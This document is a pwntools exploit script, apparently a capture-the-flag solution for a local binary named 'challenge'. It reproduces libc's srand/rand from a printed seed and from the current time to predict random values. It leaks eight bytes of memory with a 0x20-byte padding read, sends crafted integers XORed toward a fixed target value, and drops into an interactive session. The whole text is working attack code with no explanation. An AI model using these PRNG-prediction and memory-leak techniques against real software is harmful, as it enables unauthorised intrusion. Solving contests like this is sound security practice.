from pwn import *
import ctypes
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

context.binary = exe = ELF('./challenge')
#context.log_level = 'debug'

io = process()
target = 0xDEADBEEFDEADC0DE

io.recvuntil(b'Elementary_Magic================================\n')
seed = int(io.recvline(keepends=False))
LIBC.srand(seed)
v2 = LIBC.rand()
log.info(f'v2: {hex(v2)}')
io.recvuntil(b'continue:')
io.sendline(b'')
v3 = int(LIBC.time(0))
log.info(f'v3: {hex(v3)}')
io.recvuntil(b'sequence!\n')
payload = - (0xffffffffffffffff - (target ^ v2 ^ v3) + 1)
log.info(f'buf: {payload}')
io.sendline(str(payload).encode())

io.recvuntil(b'magic!\n')
io.send(b'a'*0x20)
io.recvuntil(b'a'*0x20)
v5 = u64(io.recv(8))
log.info(f'v5: {hex(v5)}')
io.recvuntil(b'continue:')
io.sendline(b'')
LIBC.srand(LIBC.time(0))
v6 = LIBC.rand()
log.info(f'v6: {hex(v6)}')
io.recvuntil(b'sequence!')
payload = - (0xffffffffffffffff - (target ^ v5 ^ v6) + 1)
log.info(f'buf: {payload}')
io.sendline(str(payload).encode())
io.interactive()
